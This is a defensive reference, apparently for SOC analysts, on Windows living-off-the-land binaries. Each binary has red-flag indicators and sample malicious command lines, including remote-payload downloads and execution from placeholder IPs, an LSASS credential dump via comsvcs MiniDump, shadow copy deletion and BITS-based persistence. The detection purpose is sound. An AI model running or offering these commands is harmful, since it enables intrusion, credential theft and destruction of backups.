# LOLBins reference

**Living Off the Land Binaries** — legitimate Windows tools abused by attackers to avoid dropping their own malware. Signed by Microsoft, supposed to be on the system, often not flagged by AV.

> The question is never "is this a real Windows binary?" — it's "is this binary doing something it has no business doing?"

Standalone KQL for each binary in [kql/process/](../kql/process/).

---

## powershell.exe

**Path:** `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`

**Malicious examples:**
```
powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAt...
powershell.exe -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://185.x.x.x/s.ps1')"
powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Users\user\AppData\Temp\a8f3b.ps1
powershell.exe -nop -w hidden -c "[System.Reflection.Assembly]::Load([Convert]::FromBase64String('TVqQ...'))"
```

**Red flags:** `-enc`, `-nop`, `-w hidden`, `IEX`, `DownloadString`, `Reflection.Assembly::Load`

> `-nop -w hidden -enc` together = almost always malicious

---

## certutil.exe

**Path:** `C:\Windows\System32\certutil.exe`  
**Legitimate use:** Certificate management

**Malicious examples:**
```
certutil.exe -urlcache -split -f "http://185.220.x.x/payload.exe" C:\Users\Public\svchost.exe
certutil.exe -decode C:\Users\user\AppData\Temp\encoded.txt C:\Users\user\AppData\Temp\payload.exe
certutil.exe -encode C:\Users\user\Documents\passwords.xlsx C:\Temp\out.txt
```

**Red flags:** `-urlcache -f` with URL, `-decode`, any URL in arguments

---

## rundll32.exe

**Path:** `C:\Windows\System32\rundll32.exe`  
**Legitimate use:** Running DLL exported functions

**Malicious examples:**
```
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 624 C:\Users\Public\lsass.dmp full
rundll32.exe C:\Users\user\AppData\Local\Temp\a9f3bc.dll,DllMain
rundll32.exe \\185.220.x.x\share\evil.dll,EntryPoint
```

> `comsvcs.dll, MiniDump` = credential dump. Escalate immediately.

**Red flags:** `comsvcs`, `MiniDump`, DLL in `Temp`/`AppData`, UNC path argument

---

## mshta.exe

**Path:** `C:\Windows\System32\mshta.exe`  
**Legitimate use:** Running `.hta` files — almost never used legitimately in modern environments

**Malicious examples:**
```
mshta.exe http://185.220.x.x/payload.hta
mshta.exe vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -enc JABj..."")(window.close)"
WINWORD.EXE → mshta.exe http://malicious-site.com/stage1.hta
```

**Red flags:** Any URL argument, `vbscript:` / `javascript:` inline, parent is an Office app

---

## wmic.exe

**Path:** `C:\Windows\System32\wbem\wmic.exe`  
**Legitimate use:** System queries, remote admin

**Malicious examples:**
```
wmic.exe /node:"192.168.1.50" process call create "cmd.exe /c powershell -enc JABj..."
wmic.exe process call create "C:\Users\Public\svchost.exe"
wmic.exe shadowcopy delete
```

**Red flags:** `process call create`, `shadowcopy delete`, `/node:` targeting internal IPs

---

## regsvr32.exe

**Path:** `C:\Windows\System32\regsvr32.exe`  
**Legitimate use:** Registering COM DLLs

**Malicious examples:**
```
regsvr32.exe /s /n /u /i:http://185.220.x.x/payload.sct scrobj.dll
regsvr32.exe /s C:\Users\user\AppData\Local\Temp\malicious.dll
```

**Red flags:** `/i:` with URL, `scrobj.dll`, DLL in `Temp`/`AppData`

---

## bitsadmin.exe

**Path:** `C:\Windows\System32\bitsadmin.exe`  
**Legitimate use:** Managing BITS download jobs

**Malicious examples:**
```
bitsadmin.exe /transfer WindowsUpdate http://185.220.x.x/update.exe C:\Users\Public\update.exe
bitsadmin.exe /create job1
bitsadmin.exe /addfile job1 http://malicious.com/p.exe C:\Temp\p.exe
bitsadmin.exe /SetNotifyCmdLine job1 C:\Temp\p.exe NULL
bitsadmin.exe /resume job1
```

> `SetNotifyCmdLine` = payload auto-executes when BITS job completes. Persists across reboots.

**Red flags:** `/transfer` with URL, `SetNotifyCmdLine`, `/create` + `/addfile`
